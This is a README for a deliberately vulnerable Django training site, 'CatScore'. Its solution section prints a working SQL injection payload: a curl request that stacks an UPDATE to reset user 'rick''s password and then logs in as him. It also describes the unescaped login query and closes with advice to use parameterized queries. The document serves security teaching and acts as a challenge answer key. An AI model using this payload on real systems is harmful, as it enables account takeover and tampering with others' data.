# CatScore

## Description
CatScore is a Django website with authenticated pages for viewing cat scores, comments, and information about the service. Its login flow is deliberately vulnerable to demonstrate the risks of constructing database queries from user input.

## Vulnerability Focus
SQL injection in the login query.

## Technology
Django, PostgreSQL, and uWSGI.

## Solution
The API login calls `User.fetch(username)`, which builds an unescaped query:
`select * from users where username = '<input>' limit 1`.

**Intended (destructive) approach** — change a known user's password, then log in (hint id 1):
```bash
curl -XPOST -H 'Content-Type: application/json' \
  -d '{"username":"rick'"'"'; update users set password=md5('"'"'password'"'"') where username = '"'"'rick'"'"' --", "password":"test"}' \
  https://api-katten.hacktraining.nl/login
# then log in as rick / password
```

## Run and Test
From this directory, start the local test environment:

```sh
docker compose -f test/docker-compose.yml up --build
```

Open <http://localhost> while the containers are running. Stop them with:

```sh
docker compose -f test/docker-compose.yml down
```

## Defensive Takeaway
Use parameterized queries for all database operations and avoid interpolating user input into SQL statements.
